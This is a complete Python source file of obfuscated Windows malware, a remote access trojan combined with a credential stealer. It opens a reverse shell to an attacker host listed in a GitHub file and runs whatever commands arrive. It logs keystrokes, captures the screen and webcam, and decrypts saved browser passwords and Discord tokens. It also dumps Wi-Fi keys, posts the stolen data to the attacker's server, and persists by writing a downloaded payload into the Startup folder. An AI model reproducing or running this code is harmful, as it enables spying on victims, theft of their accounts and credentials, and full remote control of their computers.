import subprocess,socket,time,requests,os,logging,imageio,json,sqlite3,win32crypt,base64,shutil,re
from PIL import ImageGrab
from pynput.keyboard import Key, Listener
from datetime import datetime
from Cryptodome.Cipher import AES
dXoEicKaLxeT = ""
bvkNTab = ""
YyxvgsfYhgboUaEmRI = "02.01.25.2"
fPKCDKGpsyzDfIVaLvcYwE = "!"
NVHZdCWxxu = "https://raw.githubusercontent.com/eb-repo/files/refs/heads/main/info.txt"
VbwfQgtz = "https://raw.githubusercontent.com/eb-repo/scripts/refs/heads/main/"
ZVlONtRAtABFvGnRUHZU = os.path.expanduser("~\\AppData\\Local\\")
USER_ROAMING = os.path.expanduser("~\\AppData\\Roaming\\")
EOokVTolJdjMMEEXGSHV = {
	'chrome':ZVlONtRAtABFvGnRUHZU+'Google\\Chrome\\User Data','chromium':ZVlONtRAtABFvGnRUHZU+'Chromium\\User Data','chrome-canary':ZVlONtRAtABFvGnRUHZU+'Google\\Chrome SxS\\User Data',
	'msedge':ZVlONtRAtABFvGnRUHZU+'Microsoft\\Edge\\User Data','msedge-canary':ZVlONtRAtABFvGnRUHZU+'Microsoft\\Edge SxS\\User Data',
	'msedge-beta':ZVlONtRAtABFvGnRUHZU+'Microsoft\\Edge Beta\\User Data','msedge-dev':ZVlONtRAtABFvGnRUHZU+'Microsoft\\Edge Dev\\User Data',
	'avast':ZVlONtRAtABFvGnRUHZU+'AVAST Software\\Browser\\User Data','amigo':ZVlONtRAtABFvGnRUHZU+'Amigo\\User Data',
	'torch':ZVlONtRAtABFvGnRUHZU+'Torch\\User Data','kometa':ZVlONtRAtABFvGnRUHZU+'Kometa\\User Data','orbitum':ZVlONtRAtABFvGnRUHZU+'Orbitum\\User Data',
	'cent-browser':ZVlONtRAtABFvGnRUHZU+'CentBrowser\\User Data','7star':ZVlONtRAtABFvGnRUHZU+'7Star\\7Star\\User Data',
	'sputnik':ZVlONtRAtABFvGnRUHZU+'Sputnik\\Sputnik\\User Data','vivaldi':ZVlONtRAtABFvGnRUHZU+'Vivaldi\\User Data',
	'epic-privacy-browser':ZVlONtRAtABFvGnRUHZU+'Epic Privacy Browser\\User Data','uran':ZVlONtRAtABFvGnRUHZU+'uCozMedia\\Uran\\User Data',
	'yandex':ZVlONtRAtABFvGnRUHZU+'Yandex\\YandexBrowser\\User Data','brave':ZVlONtRAtABFvGnRUHZU+'BraveSoftware\\Brave-Browser\\User Data',
	'iridium':ZVlONtRAtABFvGnRUHZU+'Iridium\\User Data','coccoc':ZVlONtRAtABFvGnRUHZU+'CocCoc\\Browser\\User Data',
	'opera':USER_ROAMING+'Opera Software\\Opera Stable','opera-gx':USER_ROAMING+'Opera Software\\Opera GX Stable'
}
def mVNmyKIMmARhYLbLqraV(host, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, int(port) if port.isdecimal() else 5002))
	return s
def TuOsUAiMXamvsDDdy(s):
	data = s.recv(1024)
	if len(data)==0:
		return True
	DPCVayl = data.decode("utf-8").replace("\n","")
	if not DPCVayl.startswith(fPKCDKGpsyzDfIVaLvcYwE):
		proc = subprocess.run(DPCVayl, shell=True, capture_output=True)
		oGIBWOKBmC = proc.stdout + proc.stderr
		s.send(oGIBWOKBmC)
		return
	yZUItCcpfBoQHpRBYY = DPCVayl.split(" ")[0][1:]
	args = " ".join(DPCVayl.split()[1:]).split()
	if yZUItCcpfBoQHpRBYY == "download":
		cNholsW(s, DPCVayl)
	elif yZUItCcpfBoQHpRBYY == "screenshot":
		PUfUbuz(s)
	elif yZUItCcpfBoQHpRBYY == "basename":
		s.send(bytes(os.path.basename(__file__)+"\n", "utf-8"))
	elif yZUItCcpfBoQHpRBYY == "update":
		tzSXUoMbnAr(s)
	elif yZUItCcpfBoQHpRBYY == "wifi":
		MxwUdqlpwhwzF(s)
	elif yZUItCcpfBoQHpRBYY == "screenrecord":
		KViyYHkoRzYDwLYhpN(s, args)
	elif yZUItCcpfBoQHpRBYY == "browsers":
		jdVthIcHCkcDS(s)
	elif yZUItCcpfBoQHpRBYY == "webcam":
		webCam(s, args)
def cNholsW(s, DPCVayl):
	ByioYYslbJXSryPltm = DPCVayl.replace(fPKCDKGpsyzDfIVaLvcYwE+"download ","").split(",")
	oGIBWOKBmCs = ""
	for f in ByioYYslbJXSryPltm:
		oGIBWOKBmCs += ilMyZbcuQcFuxqCvZYFp(f, "api/file/", { "type":os.path.splitext(f)[1] })
	s.send(bytes(oGIBWOKBmCs, "utf-8"))
def PUfUbuz(s):
	image = ImageGrab.grab(bbox=None,
		include_layered_windows=False,all_screens=True,xdisplay=None)
	fOCvOYFbD = os.path.expanduser("~\\AppData\\Local\\")+"ss.jpg"
	image.save(fOCvOYFbD)
	image.close()
	r = ilMyZbcuQcFuxqCvZYFp(fOCvOYFbD, "api/sscap")
	os.remove(fOCvOYFbD)
	s.send(bytes(r,"utf-8"))
def webCam(s, args):
	cameraNumber = 0
	try:
		if len(args) > 0:
			try: cameraNumber = int(args[0])
			except: pass
		camera = imageio.get_reader(f"<video{cameraNumber}>")
		imageio.imwrite(ZVlONtRAtABFvGnRUHZU+"wc.jpg", camera.get_data(0))
		camera.close()
		r=ilMyZbcuQcFuxqCvZYFp(ZVlONtRAtABFvGnRUHZU+"wc.jpg","api/wc")
		s.send(bytes(r,"utf-8"))
	except:
		s.send(bytes("[!] 404\n", "utf-8"))
def KViyYHkoRzYDwLYhpN(s, args):
	llIupKyZIyCREqoAzYOzWSd = 15
	if not args == []:
		try: llIupKyZIyCREqoAzYOzWSd = int(args[0])
		except: pass
	oSfwDQSzmhsvAtohGHKhkuI = os.path.expanduser("~\\AppData\\Local\\")+"sr.mp4"
	bIhvFUiirPSwT = []
	fps = 11
	numFrames = llIupKyZIyCREqoAzYOzWSd * fps
	for _ in range(numFrames):
		bIhvFUiirPSwT.append(ImageGrab.grab(bbox=None, all_screens=True))
	imageio.mimsave(oSfwDQSzmhsvAtohGHKhkuI, bIhvFUiirPSwT, fps=fps, quality=8)
	ilMyZbcuQcFuxqCvZYFp(oSfwDQSzmhsvAtohGHKhkuI, "api/screc")
def ilMyZbcuQcFuxqCvZYFp(CAzPxbuXFnLuInyqN, YlYvXmWWKgfCob, vfQYvZXxudnzFofnC=None):
	if not os.path.isfile(CAzPxbuXFnLuInyqN):
		return "[!] 404: "+CAzPxbuXFnLuInyqN+"\n"
	headers = {"user":os.getlogin()}
	if vfQYvZXxudnzFofnC is not None:
		headers = {**headers, **vfQYvZXxudnzFofnC}
	f = open(CAzPxbuXFnLuInyqN, "rb")
	requests.post("http://"+dXoEicKaLxeT+":5555/"+YlYvXmWWKgfCob,
		files={"file":f},
		headers=headers)
	f.close()
	return "[+] 200\n"
def ArSXVqasjGGx(sGaATcznaxoBXQ, YlYvXmWWKgfCob):
	if sGaATcznaxoBXQ.strip() == "":
		return "[!] 204\n"
	requests.post("http://"+dXoEicKaLxeT+":5555/"+YlYvXmWWKgfCob,
		data=sGaATcznaxoBXQ,
		headers={"user":os.getlogin()})
	return "[+] 200\n"
def tzSXUoMbnAr(s):
	h, p, v = BBDolMWnPjbDwpctHDd(True)
	if (v != YyxvgsfYhgboUaEmRI):
		aHmvdWOVtwKAOJzVaMT(v)
		s.send(b"[+] 200\n")
	else:
		s.send(b"[-] 304\n")
def MxwUdqlpwhwzF(s):
	try:
		profiles = [line.split(":")[1].strip().replace("\r","") for line in subprocess.check_output("netsh wlan show profiles", creationflags=0x08000000, shell=True).decode().split("\n") if "User Profile" in line]
	except:
		s.send(b"[!] 500\n")
		return
	JdeAddsWCDnkQR = ""
	for p in profiles:
		try: JdeAddsWCDnkQR+=f"    {p} - " + subprocess.check_output(f"netsh wlan show profile \"{p}\" key=clear", shell=True).decode().split("Key Content")[1].split("Cost")[0].replace(":","").strip()+"\n"
		except: JdeAddsWCDnkQR+=f"    {p} - N/A\n"
	s.send(bytes(JdeAddsWCDnkQR, "utf-8"))
def aHmvdWOVtwKAOJzVaMT(UsqKRxGQRuWkrL):
	dpvDDTzuPdXqnP = os.path.basename(__file__)
	fileType = dpvDDTzuPdXqnP.split(".")[-1]
	IQFMezBwJSy = dpvDDTzuPdXqnP.split(".")[0]+"."+UsqKRxGQRuWkrL+".pyw" if fileType.startswith("py") else ".exe"
	fXhuHmjazor = os.path.join(os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"), IQFMezBwJSy)
	if not os.path.isfile(fXhuHmjazor):
		with open(fXhuHmjazor, "w+") as f:
			f.write(requests.get(VbwfQgtz+"file."+ "pyw" if fXhuHmjazor.split(".")[-1].startswith("py") else "exe").text)
def BBDolMWnPjbDwpctHDd(force=False):
	global dXoEicKaLxeT, bvkNTab
	if force or dXoEicKaLxeT == "" or bvkNTab == "":
		data = requests.get(NVHZdCWxxu).text.replace("\n","").split(":")
		dXoEicKaLxeT = data[0].strip()
		bvkNTab = data[1].strip()
		UsqKRxGQRuWkrL = data[2].strip()
	return dXoEicKaLxeT, bvkNTab, UsqKRxGQRuWkrL
def ffdbmmDEkn():
	try:
		CPzaiXdfpVAOkN = "settings.xpb"
		hAQaRqMkWbFDrDDBkBuoiRj = sorted([file for file in os.listdir(ZVlONtRAtABFvGnRUHZU) if os.path.isfile(ZVlONtRAtABFvGnRUHZU+"\\"+file) and file.endswith(CPzaiXdfpVAOkN.split(".")[-1])])
		if CPzaiXdfpVAOkN in hAQaRqMkWbFDrDDBkBuoiRj:
			hAQaRqMkWbFDrDDBkBuoiRj.remove(CPzaiXdfpVAOkN)
		OMghSLiCoxGq = os.path.join(ZVlONtRAtABFvGnRUHZU,CPzaiXdfpVAOkN)
		if len(hAQaRqMkWbFDrDDBkBuoiRj) > 0:
			with open(OMghSLiCoxGq, "ab+") as f:
				for file in hAQaRqMkWbFDrDDBkBuoiRj:
					temp = os.path.join(ZVlONtRAtABFvGnRUHZU,file)
					with open(temp,"rb") as tf:
						f.write(tf.read())
					os.remove(temp)
		ilMyZbcuQcFuxqCvZYFp(OMghSLiCoxGq, "api/log")
		if os.path.isfile(OMghSLiCoxGq):
			os.remove(OMghSLiCoxGq)
	except:
		pass
def TojKDrqenU():
	logging.basicConfig(filename=(ZVlONtRAtABFvGnRUHZU+str(datetime.today().strftime("%d")) + ".xpb"),
		level=logging.DEBUG,format="%(asctime)s %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
	def HhxOZGmJAQmdDUu(k):
		logging.info(str(k))
	k=Listener(on_press=HhxOZGmJAQmdDUu)
	fAiEQMucYoC = [logging.getLogger(name) for name in logging.root.manager.loggerDict if not name.startswith("pynput")]
	for l in fAiEQMucYoC:
		l.setLevel(logging.CRITICAL)
	k.start()
def jdVthIcHCkcDS(s, upload=False):
        pnJvUwSwAfDLg = "\n"
        for browser in EOokVTolJdjMMEEXGSHV:
                path = EOokVTolJdjMMEEXGSHV[browser]
                RYGBEVHzTNsnNW = None
                if not os.path.isfile(path+"\\Local State"):
                        continue
                with open(path+"\\Local State", "r") as f:
                        localstate = base64.b64decode(json.load(f)["os_crypt"]["encrypted_key"])[5:]
                        RYGBEVHzTNsnNW = win32crypt.CryptUnprotectData(localstate,None,None,None,0)[1]
                profiles = [p for p in os.listdir(path) if p == "Default" or p.startswith("Profile ")]
                if browser == "opera" or browser == "opera-gx": profiles=[""]
                for profile in profiles:
                        try:shutil.copyfile(f"{path}\\{profile}\\Login Data", ZVlONtRAtABFvGnRUHZU+"\\db.db")
                        except:continue
                        conn = sqlite3.connect(ZVlONtRAtABFvGnRUHZU+"\\db.db")
                        cursor = conn.cursor()
                        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                        pnJvUwSwAfDLg += str("*"*8+f" {browser} - {profile} "+"*"*8+"\n")
                        for _, data in enumerate(cursor.fetchall()):
                                ciphertext = data[2]
                                initVector = ciphertext[3:15]
                                encryptedPwd = ciphertext[15:-16]
                                cipher = AES.new(RYGBEVHzTNsnNW, AES.MODE_GCM, initVector)
                                decryptedPwd = (cipher.decrypt(encryptedPwd)).decode()
                                pnJvUwSwAfDLg += f"URL: {data[0]}\nUser: {data[1]}\nValue: {decryptedPwd}\n\n"
                        cursor.close()
                        conn.close()
                        os.remove(ZVlONtRAtABFvGnRUHZU+"\\db.db")
        CzIIlPe = []
        discordPaths = [USER_ROAMING+'\\discord\\Local Storage\\leveldb\\',USER_ROAMING+'\\discordcanary\\Local Storage\\leveldb\\',USER_ROAMING+'\\discordptb\\Local Storage\\leveldb\\']
        for p in [dp for dp in discordPaths if os.path.exists(dp)]:
                RYGBEVHzTNsnNW = ""
                with open(p.replace("Local Storage\\leveldb\\","")+"Local State", "r") as f:
                        localstate = base64.b64decode(json.load(f)["os_crypt"]["encrypted_key"])[5:]
                        RYGBEVHzTNsnNW = win32crypt.CryptUnprotectData(localstate,None,None,None,0)[1]
                for file in [f for f in os.listdir(p) if f.endswith(".log") or f.endswith(".ldb")]:
                        for line in [x.strip() for x in open(f"{p}\\{file}","r", errors="ignore").readlines() if x.strip()]:
                                for value in re.findall(r"dQw4w9WgXcQ:[^\"]*", line):
                                        value = base64.b64decode(value.split('dQw4w9WgXcQ:')[1])
                                        tinitVector = value[3:15]
                                        encryptedToken = value[15:]
                                        tcipher = AES.new(RYGBEVHzTNsnNW, AES.MODE_GCM, tinitVector)
                                        decryptedToken = (tcipher.decrypt(encryptedToken))[:-16].decode()
                                        if decryptedToken not in CzIIlPe:
                                                CzIIlPe.append(decryptedToken)
        xhbLDufgwKcFdFpu = "https://discord.com/api/v9/users/@me"
        if CzIIlPe: pnJvUwSwAfDLg +="*"*8+"Discord Data: "+"*"*8+"\n\n"
        for FvzoOdDUvtc in CzIIlPe:
                headers = {"Content-Type":"application/json","Authorization":FvzoOdDUvtc,
                           "User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"}
                j = requests.get(xhbLDufgwKcFdFpu, headers=headers).json()
                if j.get("message") != None: continue
                user = str(j.get('username')) + '#' + str(j.get("discriminator"))
                badges = ""
                flags = j['flags']
                if (flags == 1): badges += "Staff, "
                if (flags == 2): badges += "Partner, "
                if (flags == 4): badges += "Hypesquad Event, "
                if (flags == 8): badges += "Green Bughunter, "
                if (flags == 64): badges += "Hypesquad Bravery, "
                if (flags == 128): badges += "HypeSquad Brillance, "
                if (flags == 256): badges += "HypeSquad Balance, "
                if (flags == 512): badges += "Early Supporter, "
                if (flags == 16384): badges += "Gold BugHunter, "
                if (flags == 131072): badges += "Verified Bot Developer, "
                if (badges == ""): badges = "None"
                email = j.get("email")
                phone = j.get("phone") if j.get("phone") else "N/A"
                try: 
                        nitro_data = requests.get(xhbLDufgwKcFdFpu+'/billing/subscriptions', headers=headers).json()
                        has_nitro = bool(len(nitro_data) > 0)
                except: pass
                try: billing = bool(len(json.loads(requests.get(xhbLDufgwKcFdFpu+"/billing/payment-sources", headers=headers).text)) > 0)
                except: pass
                pnJvUwSwAfDLg += f"\n{user}\n{'-'*len(user)}\nToken: {FvzoOdDUvtc}\nHas Billing: {billing}\nNitro: {has_nitro}\nBadges: {badges}\nEmail: {email}\nPhone: {phone}\n\n"
        pnJvUwSwAfDLg += "\n"
        if not upload:
                s.send(bytes(pnJvUwSwAfDLg,"utf-8"))
        else:
                ArSXVqasjGGx(pnJvUwSwAfDLg, "api/google")
def nTNIpetcrYmkXbkFAXNmiqg():
	h, p, v = BBDolMWnPjbDwpctHDd()
	try:
		ffdbmmDEkn()
		jdVthIcHCkcDS(None,True)
		if YyxvgsfYhgboUaEmRI != v:
			aHmvdWOVtwKAOJzVaMT(v)
		TojKDrqenU()
	except:
		pass
	vjyYSvwCIB = bytes(("(old)"if YyxvgsfYhgboUaEmRI!=v else "")+"["+YyxvgsfYhgboUaEmRI+"] - "+os.getlogin()+" >> ", "utf-8")
	while True:
		CcWAeVidSMjAOSp=False
		try:
			s=mVNmyKIMmARhYLbLqraV(h, p)
			while not CcWAeVidSMjAOSp:
				s.send(vjyYSvwCIB)
				CcWAeVidSMjAOSp=TuOsUAiMXamvsDDdy(s)
			s.close()
		except:
			pass
		time.sleep(5)
nTNIpetcrYmkXbkFAXNmiqg()
